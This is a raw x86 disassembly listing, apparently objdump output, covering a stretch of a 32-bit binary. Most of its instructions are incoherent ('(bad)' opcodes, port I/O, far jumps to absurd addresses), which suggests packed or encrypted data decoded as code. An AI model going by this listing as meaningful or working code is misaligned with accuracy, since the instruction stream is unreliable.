  405191:	mov    eax,0x1989c1e0
  405196:	pop    edx
  405197:	dec    ebx
  405198:	repnz push 0x30
  40519b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40519c:	in     al,0x53
  40519e:	scas   eax,DWORD PTR es:[edi]
  40519f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4051a0:	mov    edi,0x2307b4da
  4051a5:	fneni(8087 only) 
  4051a7:	test   eax,0x6ad8d1df
  4051ac:	add    esp,DWORD PTR [ecx-0x3ce42e35]
  4051b2:	mov    ebp,0xf4ed6b5b
  4051b7:	dec    esi
  4051b8:	(bad)  
  4051b9:	adc    esp,edx
  4051bb:	ret    
  4051bc:	mov    ecx,0x883d0d64
  4051c1:	mul    DWORD PTR [ebx+0x4b1b9ef2]
  4051c7:	push   edx
  4051c8:	xor    dl,bh
  4051ca:	pop    edi
  4051cb:	imul   cx,dx,0x5a
  4051cf:	xor    BYTE PTR [ecx-0x7ea7264],0xa3
  4051d6:	or     BYTE PTR [ebx+0x6b],dl
  4051d9:	mov    ds:0xd9ee35ac,eax
  4051de:	ret    
  4051df:	lods   eax,DWORD PTR ds:[esi]
  4051e0:	lods   al,BYTE PTR ds:[esi]
  4051e1:	sbb    ebx,DWORD PTR [edi+0x5b]
  4051e4:	push   ecx
  4051e5:	hlt    
  4051e6:	push   0x1c
  4051e8:	je     0x405192
  4051ea:	jg     0x40524c
  4051ec:	cmc    
  4051ed:	or     BYTE PTR [ecx+0x5edddcfb],0xba
  4051f4:	mov    dh,0x6d
  4051f6:	das    
  4051f7:	fcmovb st,st(0)
  4051f9:	adc    eax,0x2170dcd4
  4051fe:	sbb    ah,BYTE PTR [ebp-0x6f]
  405201:	mov    ebp,DWORD PTR [edi]
  405203:	arpl   WORD PTR [ecx+0x4d81d7c2],cx
  405209:	loopne 0x40522b
  40520b:	mov    dh,0x62
  40520d:	js     0x4051ea
  40520f:	mov    ss,WORD PTR [ebp+0x609381ff]
  405215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405216:	push   ecx
  405217:	shr    BYTE PTR [edx-0x22],1
  40521a:	inc    edi
  40521b:	cmp    ebp,DWORD PTR [edi-0x63]
  40521e:	jae    0x4051d5
  405220:	gs loop 0x40527d
  405223:	fwait
  405224:	jg     0x4051e5
  405226:	xchg   edi,eax
  405227:	sub    al,BYTE PTR [ecx-0x794dec1e]
  40522d:	fmul   DWORD PTR [eax+0x14]
  405230:	pop    es
  405231:	pop    ebp
  405232:	and    eax,0x7b8e169e
  405237:	sar    bh,cl
  405239:	pop    ebp
  40523a:	xchg   esp,eax
  40523b:	mov    dl,0x97
  40523d:	pusha  
  40523e:	outs   dx,BYTE PTR ds:[esi]
  40523f:	inc    edi
  405240:	push   DWORD PTR [esi+ebx*4+0x397ca997]
  405247:	pop    eax
  405248:	out    dx,eax
  405249:	je     0x4052b5
  40524b:	pop    edx
  40524c:	test   BYTE PTR [eax+eax*4],dh
  40524f:	pop    ss
  405250:	aam    0x22
  405252:	stos   BYTE PTR es:[edi],al
  405253:	aam    0xea
  405255:	mov    ch,0xed
  405257:	xor    BYTE PTR [ebp+0x34],al
  40525a:	fwait
  40525b:	sub    eax,0x877dc3dc
  405260:	sar    DWORD PTR [edx+edx*2+0x3b0bfcc6],0x65
  405268:	and    DWORD PTR [edi+0x5a6b2350],eax
  40526e:	in     eax,0xf2
  405270:	mov    ds:0xce06e1ad,al
  405275:	fwait
  405276:	leave  
  405277:	mov    dl,0xa5
  405279:	xchg   edx,eax
  40527a:	jecxz  0x40527c
  40527c:	jmp    0x4052bc
  40527e:	cmp    al,dh
  405280:	in     eax,0xce
  405282:	lea    esp,[eax]
  405284:	fnstsw WORD PTR [eax+0x19]
  405287:	inc    esi
  405289:	test   eax,0xa4941a9f
  40528e:	call   0x4fbd9220
  405293:	fstp   QWORD PTR [edi-0x6e9514f1]
  405299:	xchg   DWORD PTR [ebx+0x51],esi
  40529c:	xchg   ebx,eax
  40529d:	fsub   QWORD PTR [ebp-0x8]
  4052a0:	add    al,0x91
  4052a2:	dec    eax
  4052a3:	jp     0x4052b2
  4052a5:	scas   al,BYTE PTR es:[edi]
  4052a6:	pushf  
  4052a7:	scas   eax,DWORD PTR es:[edi]
  4052a8:	hlt    
  4052a9:	ins    DWORD PTR es:[edi],dx
  4052aa:	cmovge edx,DWORD PTR [esi+0x4c]
  4052ae:	lea    ecx,[ebx+eax*4]
  4052b1:	(bad)  [ebx+0x6d]
  4052b4:	icebp  
  4052b5:	shr    BYTE PTR [ecx+0x75d1988e],1
  4052bb:	cdq    
  4052bc:	(bad)  
  4052bd:	leave  
  4052be:	cs push ecx
  4052c0:	pop    ebx
  4052c1:	sbb    eax,0xae132e35
  4052c6:	ss inc edi
  4052c8:	(bad)  
  4052c9:	or     BYTE PTR [edi+0x4939f11a],ch
  4052cf:	hlt    
  4052d0:	inc    edx
  4052d1:	push   ecx
  4052d2:	sbb    BYTE PTR [eax-0x58],0xa1
  4052d6:	mov    esp,0x4f1169f8
  4052db:	mov    ecx,DWORD PTR [esi-0x3e181172]
  4052e1:	push   ss
  4052e2:	jns    0x4052e3
  4052e4:	(bad)  
  4052e5:	dec    esi
  4052e6:	test   BYTE PTR [edi-0x1],dh
  4052e9:	and    DWORD PTR [eax-0x25],ebx
  4052ec:	retf   0xaed
  4052ef:	loopne 0x40532a
  4052f1:	test   eax,0xb83bed5f
  4052f6:	repnz sbb DWORD PTR cs:[edi+0x58c7bc61],esp
  4052fe:	inc    ecx
  4052ff:	mov    BYTE PTR [eax+esi*2-0xb],dl
  405303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405304:	or     ebp,DWORD PTR [edi-0x15f97a83]
  40530a:	js     0x4052fb
  40530c:	jge    0x4052d3
  40530e:	sbb    al,0x79
  405310:	inc    DWORD PTR [ebp+0x6a]
  405313:	sahf   
  405314:	fiadd  WORD PTR [ecx]
  405316:	neg    BYTE PTR [esi+0x38]
  405319:	or     ah,BYTE PTR [eax-0x18]
  40531c:	loopne 0x4052e9
  40531e:	cmp    al,0x5b
  405320:	push   0x21
  405322:	or     eax,0x1061584d
  405327:	sbb    DWORD PTR [eax],0x439ea9fb
  40532d:	shl    ah,cl
  40532f:	push   0x8f21c86e
  405334:	(bad)
  405337:	adc    edi,eax
  405339:	aaa    
  40533a:	mov    dl,0x5b
  40533c:	in     eax,0x39
  40533e:	jb     0x40539c
  405340:	xlat   BYTE PTR ds:[ebx]
  405341:	inc    edi
  405342:	sub    al,0x4e
  405344:	in     eax,0x5d
  405346:	push   ebp
  405347:	into   
  405348:	clc    
  405349:	pop    ds
  40534a:	fadd   DWORD PTR [ebx+ecx*1]
  40534d:	or     al,0xb6
  40534f:	push   edi
  405350:	sahf   
  405351:	rcr    ecx,1
  405353:	xchg   edx,eax
  405354:	jo     0x405342
  405356:	push   cs
  405357:	rcl    DWORD PTR [esi],0xfd
  40535a:	jbe    0x405309
  40535c:	(bad)  
  40535d:	push   ss
  40535e:	xlat   BYTE PTR ds:[ebx]
  40535f:	push   0xffffffe1
  405361:	enter  0x7641,0x9
  405365:	mov    ch,0x39
  405367:	mov    esp,gs
  405369:	enter  0xcc15,0x8a
  40536d:	xchg   ecx,eax
  40536e:	out    dx,al
  40536f:	sbb    eax,0x878ca5ff
  405374:	mov    cl,0x79
  405376:	rcl    bh,cl
  405378:	dec    esi
  405379:	cmc    
  40537a:	xchg   esp,eax
  40537b:	sub    BYTE PTR [ebp-0x1b],bh
  40537e:	fwait
  40537f:	mov    fs,WORD PTR gs:[eax+0x152ebde9]
  405386:	mov    cl,0x61
  405388:	sar    dl,0x4d
  40538b:	cli    
  40538c:	push   ebp
  40538d:	popf   
  40538e:	into   
  40538f:	iret   
  405390:	cmp    dl,BYTE PTR [ecx]
  405392:	mov    dh,0xf4
  405394:	or     al,0xe7
  405396:	jmp    0x4053f9
  405398:	cmp    al,0x5f
  40539a:	inc    edx
  40539b:	stc    
  40539c:	sub    DWORD PTR [ebx+0x6e1eec26],ebp
  4053a2:	and    eax,0xe6fc6e5c
  4053a7:	cmp    ch,BYTE PTR [ecx]
  4053a9:	in     eax,0xf9
  4053ab:	sub    DWORD PTR [ebp+0x64e058bd],esp
  4053b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053b2:	shl    DWORD PTR [ebx+0x42973edf],1
  4053b8:	sahf   
  4053b9:	inc    eax
  4053ba:	inc    ebx
  4053bb:	pop    ecx
  4053bc:	xchg   esi,eax
  4053bd:	push   edi
  4053be:	inc    edx
  4053bf:	sar    ebp,1
  4053c1:	or     ah,BYTE PTR [edx+0x4c08f827]
  4053c7:	addr16 push ss
  4053c9:	lods   al,BYTE PTR ds:[esi]
  4053ca:	test   DWORD PTR [ebx+0x760c93d],ebx
  4053d0:	sar    bl,cl
  4053d2:	push   ss
  4053d3:	nop
  4053d4:	and    edx,esi
  4053d6:	ins    BYTE PTR es:[edi],dx
  4053d7:	cmp    ebp,DWORD PTR [ebx]
  4053d9:	dec    ecx
  4053da:	lahf   
  4053db:	inc    ebx
  4053dc:	or     al,0x5d
  4053de:	outs   dx,DWORD PTR ds:[esi]
  4053df:	test   al,0xff
  4053e1:	add    eax,0x399ab34e
  4053e6:	cmp    eax,0x6bb9333e
  4053eb:	push   0xffffffd6
  4053ed:	int3   
  4053ee:	mov    eax,ds:0xafcdafcc
  4053f3:	in     eax,dx
  4053f4:	dec    ebx
  4053f5:	and    ebx,esp
  4053f7:	xchg   edx,eax
  4053f8:	inc    ebx
  4053f9:	retf   
  4053fa:	push   cs
  4053fb:	fdiv   st,st(4)
  4053fd:	sub    BYTE PTR [esi+edi*4],dh
  405400:	out    0xf9,al
  405402:	mov    al,0xd8
  405404:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405405:	pusha  
  405406:	sub    eax,DWORD PTR [ebp-0x54]
  405409:	mov    ecx,0x9c45b6df
  40540e:	jle    0x405432
  405410:	arpl   WORD PTR [ecx-0x433feef0],cx
  405416:	mov    ds,WORD PTR [edx]
  405418:	dec    eax
  405419:	fs enter 0xf37b,0xb1
  40541e:	jmp    0xd131ee10
  405423:	or     DWORD PTR [ebx+0x5b],0xc96733c1
  40542a:	addr16 dec ebp
  40542c:	(bad)  [edi+eax*8]
  40542f:	shr    cl,1
  405431:	(bad)  
  405432:	and    edx,DWORD PTR ds:[esi]
  405435:	outs   dx,DWORD PTR ds:[esi]
  405436:	(bad)  
  405437:	pop    esp
  405438:	push   ebp
  405439:	imul   ecx,DWORD PTR [edx+0x31],0x9ff893dd
  405440:	inc    ecx
  405441:	mov    ds:0x36129cb0,al
  405446:	dec    esp
  405447:	aaa    
  405448:	cmovp  edx,edi
  40544b:	ror    BYTE PTR [ebp-0x2e],0xfd
  40544f:	add    edx,DWORD PTR [edx-0x2164d159]
  405455:	outs   dx,BYTE PTR ds:[esi]
  405456:	push   ecx
  405457:	inc    eax
  405458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405459:	dec    edi
  40545a:	enter  0x82de,0xf8
  40545e:	mov    ch,0x14
  405460:	adc    eax,0xe690a32b
  405465:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405466:	and    dh,BYTE PTR [ebx+edi*2-0x487c7166]
  40546d:	fisttp DWORD PTR [ecx+0x3e3004fd]
  405473:	mov    ebx,0xc1c604c5
  405478:	or     eax,0xfd981c72
  40547d:	in     al,dx
  40547e:	sbb    al,0x2d
  405480:	pop    esi
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e784
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e6eb,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	sub    BYTE PTR [edx+0x37105a40],0x70
  4054af:	jo     0x40545b
  4054b1:	jle    0x405523
  4054b3:	jo     0x4054a2
  4054b5:	xchg   BYTE PTR [ebp-0x553e4134],ch
  4054bb:	pushf  
  4054bc:	mov    al,ds:0x6ab87f2c
  4054c1:	stos   DWORD PTR es:[edi],eax
  4054c2:	pop    ss
  4054c3:	push   ss
  4054c4:	popa   
  4054c5:	xchg   edi,eax
  4054c6:	enter  0xb1d2,0x24
  4054ca:	mov    ds:0xc887e2f5,eax
  4054cf:	out    0xb1,eax
  4054d1:	cmp    bh,0xb8
  4054d4:	xchg   ecx,eax
  4054d5:	imul   esp,DWORD PTR [eax+esi*4-0x3f],0x6f16dc65
  4054dd:	std    
  4054de:	jno    0x40547f
  4054e0:	mov    ecx,0xe3827635
  4054e5:	leave  
  4054e6:	push   esp
  4054e7:	retf   
  4054e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054e9:	imul   esi,DWORD PTR [edi],0x43760c0b
  4054ef:	and    dl,BYTE PTR [edx+esi*8+0x5d]
  4054f3:	sbb    al,0x44
  4054f5:	cwde   
  4054f6:	out    dx,al
  4054f7:	or     al,0xc4
  4054f9:	hlt    
  4054fa:	mov    ah,0x15
  4054fc:	mov    esi,0x66d96e35
  405501:	or     ecx,DWORD PTR [esi-0x124dd587]
  405507:	fild   QWORD PTR [edi-0x1c7eeff5]
  40550d:	test   eax,0x6a348ee
  405512:	aad    0xad
  405514:	or     edi,DWORD PTR [edx]
  405516:	xchg   DWORD PTR [esi+0x4],edx
  405519:	push   esi
  40551a:	scas   al,BYTE PTR es:[edi]
  40551b:	faddp  st(7),st
  40551d:	ret    
  40551e:	mov    eax,ds:0x5eab7d79
  405523:	mov    al,BYTE PTR [edx+0x329c6c7d]
  405529:	mov    eax,ds:0x32577d0b
  40552e:	(bad)  [edi+0x14]
  405531:	mov    ah,0x34
  405533:	aad    0x4
  405535:	add    BYTE PTR [ebp-0x77],0xaa
  405539:	stos   BYTE PTR es:[edi],al
  40553a:	popa   
  40553b:	das    
  40553c:	push   0xffffffda
  40553e:	mov    esi,0x1dd399dc
  405543:	or     DWORD PTR [eax-0x4b],edi
  405546:	dec    ebx
  405547:	hlt    
  405548:	fs aam 0x7d
  40554b:	cmp    al,0x3b
  40554d:	dec    esp
  40554e:	xchg   ebx,eax
  40554f:	sub    eax,0x3101365a
  405554:	mov    esp,0x827b1fa2
  405559:	lock call FWORD PTR [ecx-0x36d9b536]
  405560:	push   ds
  405561:	jle    0x405517
  405563:	xchg   ecx,eax
  405564:	xor    DWORD PTR [ecx+0x1033f0fa],0xcae6dd3c
  40556e:	leave  
  40556f:	(bad)  
  405570:	adc    ebx,DWORD PTR [edx+0x36]
  405573:	adc    eax,edx
  405575:	dec    ebp
  405576:	(bad)  
  405577:	jns    0x4055f3
  405579:	stos   BYTE PTR es:[edi],al
  40557a:	ret    
  40557b:	dec    ebx
  40557c:	mov    esp,0x4cfa42ec
  405581:	fisubr WORD PTR [eax]
  405583:	jo     0x4055b6
  405585:	clc    
  405586:	jbe    0x405545
  405588:	mov    ebx,DWORD PTR [esi]
  40558a:	les    edx,FWORD PTR [ecx-0x5c1451de]
  405590:	dec    edx
  405591:	rol    dl,cl
  405593:	xor    BYTE PTR [ecx-0x4],0x99
  405597:	pop    eax
  405598:	jp     0x40557e
  40559a:	int    0xa3
  40559c:	addr16 push cs
  40559e:	fnstenv [eax]
  4055a0:	adc    ecx,ebx
  4055a2:	out    0xaa,eax
  4055a4:	xor    al,0xef
  4055a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055a7:	sub    eax,0x1d593861
  4055ac:	push   ebx
  4055ad:	pop    eax
  4055ae:	mov    dh,0x2b
  4055b0:	aas    
  4055b1:	dec    ecx
  4055b2:	dec    ebp
  4055b3:	jns    0x40562b
  4055b5:	(bad)  
  4055b6:	into   
  4055b7:	mov    ebp,0xf0cc5960
  4055bc:	fst    st(2)
  4055be:	mov    dl,0x74
  4055c0:	sbb    eax,DWORD PTR [esi+0x71556454]
  4055c6:	and    BYTE PTR [eax+0x2280d2d3],0x86
  4055cd:	pop    ds
  4055ce:	stos   BYTE PTR es:[edi],al
  4055cf:	xchg   ebp,ebx
  4055d1:	ds mov edi,0x42c0cb95
  4055d7:	gs mov dh,0xae
  4055da:	sbb    bl,BYTE PTR [esi+0xb]
  4055dd:	rol    BYTE PTR [esi-0x37d34cfb],1
  4055e3:	pop    es
  4055e4:	ds fmul st(7),st
  4055e7:	push   ds
  4055e8:	ss ins DWORD PTR es:[edi],dx
  4055ea:	stos   BYTE PTR es:[edi],al
  4055eb:	xchg   edx,eax
  4055ec:	mov    esi,edi
  4055ee:	neg    bh
  4055f0:	pusha  
  4055f1:	jb     0x405645
  4055f3:	cli    
  4055f4:	jl     0x4055b0
  4055f6:	sbb    BYTE PTR [ecx-0x7a],dh
  4055f9:	je     0x4055cb
  4055fb:	dec    DWORD PTR [edx+0x6]
  4055fe:	lea    esp,[esi+0x59]
  405601:	das    
  405602:	jb     0x40567d
  405604:	or     esp,edx
  405606:	ss adc eax,esp
  405609:	cmp    eax,0xecf9bfb
  40560e:	jle    0x405598
  405610:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405611:	bound  esp,QWORD PTR [edx+0x43]
  405614:	pop    ecx
  405615:	ins    DWORD PTR es:[edi],dx
  405616:	or     DWORD PTR [esi],esp
  405618:	inc    edx
  405619:	les    edx,FWORD PTR [ebx-0x64]
  40561c:	fcomp  QWORD PTR fs:[ebx+0x25]
  405620:	popa   
  405621:	test   al,0x8a
  405623:	push   ds
  405624:	pop    esi
  405625:	jge    0x4055f4
  405627:	mov    bl,0x4d
  405629:	jo     0x4055cb
  40562b:	sbb    bh,cl
  40562d:	pop    edx
  40562e:	mov    ecx,0xa65dcd3d
  405633:	push   ss
  405634:	sub    BYTE PTR [esi],bh
  405636:	cmp    ch,0x3e
  405639:	xchg   ebp,eax
  40563a:	iret   
  40563b:	xor    BYTE PTR [edx+edx*1+0x4f],0x16
  405640:	(bad)  
  405641:	mov    ecx,0x6b8aac57
  405646:	adc    BYTE PTR [esi],bl
  405648:	mov    ds:0x46d61c78,al
  40564d:	(bad)  
  40564e:	sbb    al,0xb1
  405650:	popa   
  405651:	(bad)  
  405653:	pop    ss
  405654:	int3   
  405655:	sub    al,0x45
  405657:	and    edx,DWORD PTR [edi+esi*1-0x1d4e1022]
  40565e:	xor    ecx,esi
  405660:	(bad)  
  405661:	(bad)  
  405662:	fstp   TBYTE PTR [edi-0x1ad86729]
  405668:	jne    0x405642
  40566a:	fwait
  40566b:	add    eax,0xfc849267
  405670:	sub    dl,ah
  405672:	adc    al,0xf
  405674:	pop    esi
  405675:	je     0x4055fc
  405677:	add    al,0xcf
  405679:	outs   dx,DWORD PTR ds:[esi]
  40567a:	in     eax,0x79
  40567c:	and    DWORD PTR [esp+edx*4],esi
  40567f:	(bad)  
  405681:	jo     0x40569e
  405683:	fcomp  QWORD PTR [esp+eiz*4+0x10725961]
  40568a:	leave  
  40568b:	mov    ah,bh
  40568d:	es loopne 0x40563b
  405690:	ins    DWORD PTR es:[edi],dx
  405691:	pop    ss
  405692:	in     al,dx
  405693:	jmp    0x5b76:0x1bc5dffb
  40569a:	lods   al,BYTE PTR gs:[esi]
  40569c:	sbb    al,0x5c
  40569e:	adc    BYTE PTR [esi+0x1922505],ch
  4056a4:	push   ebx
  4056a5:	(bad)  
  4056a6:	jg     0x40567b
  4056a8:	iret   
  4056a9:	and    al,0x14
  4056ab:	scas   eax,DWORD PTR es:[edi]
  4056ac:	cvttps2pi mm1,xmm5
  4056af:	push   edx
  4056b0:	jmp    esp
  4056b2:	add    al,0xb9
  4056b4:	retf   0xca1a
  4056b7:	js     0x405660
  4056b9:	cli    
  4056ba:	mov    ebx,0xd363f4f9
  4056bf:	ins    BYTE PTR es:[edi],dx
  4056c0:	fidivr WORD PTR [ebx+0x71]
  4056c3:	fucom  st(3)
  4056c5:	sar    BYTE PTR [ebp+0x72cb155c],1
  4056cb:	cmp    eax,0x65af6408
  4056d0:	dec    ebx
  4056d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056d2:	xlat   BYTE PTR ds:[ebx]
  4056d3:	dec    eax
  4056d4:	test   BYTE PTR [ebx+0x3],dh
  4056d7:	push   ebx
  4056d8:	mov    DWORD PTR [ebp+0x29425899],ecx
  4056de:	sbb    al,0x6a
  4056e0:	sub    bh,bh
  4056e2:	push   ebp
  4056e3:	push   ss
  4056e4:	adc    eax,0xdcef890
  4056e9:	scas   eax,DWORD PTR es:[edi]
  4056ea:	loopne 0x4056c8
  4056ec:	push   0xc2972462
  4056f1:	aam    0x8f
  4056f3:	mov    ebp,0xfbec46d
  4056f8:	cdq    
  4056f9:	jg     0x40571a
  4056fb:	out    dx,eax
  4056fc:	stos   DWORD PTR es:[edi],eax
  4056fd:	cmp    ebp,esi
  4056ff:	scas   eax,DWORD PTR es:[edi]
  405700:	cmp    eax,0x43d69fda
  405705:	add    eax,0x41ec4b4d
  40570a:	mov    ebp,0xeff35530
  40570f:	sbb    al,0x41
  405711:	cdq    
  405712:	lahf   
  405713:	mov    ebx,0x94502952
  405718:	dec    edx
  405719:	aaa    
  40571a:	std    
  40571b:	fdivr  DWORD PTR [ebp+0x2c]
  40571e:	inc    esi
  40571f:	ficomp DWORD PTR [ebx+0xc840488]
  405725:	fdiv   DWORD PTR [esi-0x41]
  405728:	mov    ebx,0xb3e7c0f7
  40572d:	aas    
  40572e:	fcmovnu st,st(7)
  405730:	(bad)  
  405731:	addr16 push ecx
  405733:	inc    ebp
  405734:	lahf   
  405735:	scas   al,BYTE PTR es:[edi]
  405736:	out    dx,al
  405737:	push   ecx
  405738:	bound  eax,QWORD PTR [edx+edx*8]
  40573b:	gs ds mov esp,0x2f1c4a16
  405742:	(bad)  
  405743:	push   0x402a2e7b
  405748:	loop   0x4056e8
  40574a:	dec    eax
  40574b:	rcr    BYTE PTR [edi],cl
  40574d:	jg     0x405714
  40574f:	loop   0x405796
  405751:	add    al,0x7d
  405753:	lahf   
  405754:	or     BYTE PTR [edi-0x70],0xd0
  405758:	cmp    BYTE PTR [edi],dl
  40575a:	mov    edx,0xb367abda
  40575f:	xor    BYTE PTR [ecx],dl
  405761:	or     al,0x3d
  405763:	gs mov WORD PTR ds:[edx+eax*2+0x49],fs
  405769:	sbb    BYTE PTR [ecx+0xf],dl
  40576c:	mov    bh,0x5
  40576e:	xchg   ch,bh
  405770:	inc    edx
  405771:	add    BYTE PTR [ebx],ah
  405773:	add    eax,0x42fd7a
  405778:	mov    ds:0x42fd86,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx-0x61fa6e42],eax
  405790:	ret    0x4a85
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	cdq    
  40579b:	dec    ebp
  40579c:	(bad)  
  40579d:	cdq    
  40579e:	jno    0x405811
  4057a0:	(bad)  
  4057a1:	pop    ebp
  4057a2:	cmp    dl,BYTE PTR [ebp-0x4e]
  4057a5:	dec    esi
  4057a6:	mov    bh,0xd9
  4057a8:	sub    al,0x4e
  4057aa:	lods   eax,DWORD PTR ds:[esi]
  4057ab:	ins    BYTE PTR es:[edi],dx
  4057ac:	and    ah,BYTE PTR [ebp+0x33]
  4057af:	jg     0x4057af
  4057b1:	pop    edi
  4057b2:	xor    eax,0xdf4f66d9
  4057b7:	ret    
  4057b8:	dec    esp
  4057b9:	inc    ebx
  4057ba:	(bad)  
  4057bb:	adc    BYTE PTR [esi+0x38],dh
  4057be:	mov    esp,DWORD PTR [edx-0x32]
  4057c1:	in     al,0x2c
  4057c3:	jl     0x40582c
  4057c5:	in     eax,0x5f
  4057c7:	cdq    
  4057c8:	(bad)  
  4057c9:	mov    edi,0xe6cab01c
  4057ce:	sbb    esi,esi
  4057d0:	(bad)  
  4057d1:	pop    esi
  4057d2:	hlt    
  4057d3:	mov    ecx,0xcb6f7d10
  4057d8:	ror    BYTE PTR [eax],cl
  4057da:	mov    edx,0x91070547
  4057df:	frstor [esi]
  4057e1:	(bad)  [ecx]
  4057e3:	mov    eax,0xa3d6f032
  4057e8:	pop    DWORD PTR [ebx+0x794618d8]
  4057ee:	mov    ebp,0xda7372f6
  4057f3:	aaa    
  4057f4:	daa    
  4057f5:	push   ecx
  4057f6:	(bad)  
  4057f7:	icebp  
  4057f8:	jg     0x40584f
  4057fa:	aam    0xac
  4057fc:	bound  esi,QWORD PTR [ebp-0x43]
  4057ff:	(bad)  
  405800:	stos   BYTE PTR es:[edi],al
  405801:	not    DWORD PTR [esi-0x32]
  405804:	daa    
  405805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405806:	jmp    0x8c0:0x2cb4941e
  40580d:	fwait
  40580e:	mov    BYTE PTR [eax-0x3b],al
  405811:	sti    
  405812:	scas   eax,DWORD PTR es:[edi]
  405813:	jb     0x405835
  405815:	lea    eax,[ebx]
  405817:	clc    
  405818:	fcomp  QWORD PTR [ecx+edx*1-0x187683ae]
  40581f:	int    0x1e
  405821:	mov    al,ds:0xcbe2798c
  405826:	xchg   ebx,eax
  405827:	mov    al,ds:0x85643198
  40582c:	fwait
  40582d:	lock dec ebx
  40582f:	mov    dl,0x5e
  405831:	fsub   QWORD PTR [ebp-0x36e4dd39]
  405837:	rcl    esi,0x4b
  40583a:	out    dx,eax
  40583b:	out    dx,al
  40583c:	push   esp
  40583d:	mov    ch,0xe3
  40583f:	xor    BYTE PTR ds:0x371329c8,0xcd
  405846:	ins    DWORD PTR es:[edi],dx
  405847:	(bad)  
  405848:	mov    ebp,0x12b31207
  40584d:	push   es
  40584e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40584f:	add    al,BYTE PTR [edx-0x21]
  405852:	in     eax,dx
  405853:	je     0x4058c9
  405855:	out    dx,al
  405856:	mov    ah,0x8b
  405858:	adc    BYTE PTR [esi+0x20607983],bl
  40585e:	in     al,0x18
  405860:	push   es
  405861:	retf   0xaf9e
  405864:	call   0xb721:0x1be69390
  40586b:	inc    eax
  40586c:	gs mov ah,0xd0
  40586f:	jnp    0x40583e
  405871:	adc    ax,0xc1e4
  405875:	iret   
  405876:	inc    ebp
  405877:	ds ret 0x2d3f
  40587b:	push   ss
  40587c:	mov    ebp,0xf12a09f1
  405881:	lea    esi,[eax-0xe]
  405884:	(bad)  
  405885:	pop    ecx
  405886:	mov    DWORD PTR [ebp+0xd],0x28f23d4d
  40588d:	rcr    ebp,cl
  40588f:	adc    al,0x8e
  405891:	ror    eax,0x0
  405894:	inc    ebx
  405895:	enter  0x7478,0xba
  405899:	popf   
  40589a:	bound  eax,QWORD PTR [ecx-0x58]
  40589d:	stos   DWORD PTR es:[edi],eax
  40589e:	fsubr  QWORD PTR [edx-0x50]
  4058a1:	test   BYTE PTR [edi+ecx*1],al
  4058a4:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058a6:	and    al,BYTE PTR [ecx-0x5c32d8c1]
  4058ac:	sub    eax,eax
  4058ae:	aam    0x47
  4058b0:	sub    DWORD PTR [edx+0x840e599],ecx
  4058b6:	jo     0x4058c9
  4058b8:	mov    dh,0xb6
  4058ba:	std    
  4058bb:	mov    edx,0xf4b181d9
  4058c0:	out    0x28,eax
  4058c2:	adc    al,0x1a
  4058c4:	push   ecx
  4058c5:	inc    edi
  4058c6:	out    dx,al
  4058c7:	out    dx,eax
  4058c8:	xchg   ebx,eax
  4058c9:	dec    edi
  4058ca:	fst    QWORD PTR [ebp-0x6a]
  4058cd:	jnp    0x405925
  4058cf:	repz lock pop eax
  4058d2:	mov    ds:0xfb6039ff,al
  4058d7:	hlt    
  4058d8:	jecxz  0x4058c7
  4058da:	int3   
  4058db:	mov    edx,0x6fb45fbd
  4058e0:	sbb    bh,ch
  4058e2:	lea    ebx,[esp+ebp*2+0x1d]
  4058e6:	push   ebp
  4058e7:	fdiv   DWORD PTR [eax-0x1a289b4b]
  4058ed:	adc    eax,0x53a39887
  4058f2:	sbb    DWORD PTR [ebx-0x23357629],edx
  4058f8:	call   0xab91:0x7c29c613
  4058ff:	pop    ebp
  405900:	xor    al,BYTE PTR [edx]
  405902:	xchg   edx,eax
  405903:	in     eax,0xc7
  405905:	and    ch,BYTE PTR [edi-0x7a257500]
  40590b:	mov    dl,0xcd
  40590d:	inc    ebp
  40590e:	push   esi
  40590f:	scas   al,BYTE PTR es:[edi]
  405910:	data16 scas al,BYTE PTR es:[edi]
  405912:	outs   dx,DWORD PTR ds:[esi]
  405913:	shl    BYTE PTR [eax+0x1],1
  405916:	sub    BYTE PTR [esi-0x73c272ff],bl
  40591c:	dec    eax
  40591d:	sub    cl,BYTE PTR [ebp+0x8]
  405920:	call   0xc9c1:0x228348f7
  405927:	fdiv   st(1),st
  405929:	xchg   ebx,eax
  40592a:	cmp    al,0xb8
  40592c:	or     ch,BYTE PTR [ebx+0x3812ec1a]
  405932:	pusha  
  405933:	mov    ch,0x12
  405935:	test   al,0x31
  405937:	dec    esp
  405938:	add    edx,esi
  40593a:	out    0x4f,al
  40593c:	sub    al,0x43
  40593e:	call   0x34e4d4bd
  405943:	push   eax
  405944:	dec    esi
  405945:	bsr    ebp,DWORD PTR [ebx-0x1bb8ead]
  40594c:	add    dh,0x8a
  40594f:	adc    ebp,ebp
  405951:	(bad)  
  405952:	xlat   BYTE PTR ds:[ebx]
  405953:	xor    BYTE PTR [ebp+0x24],0x27
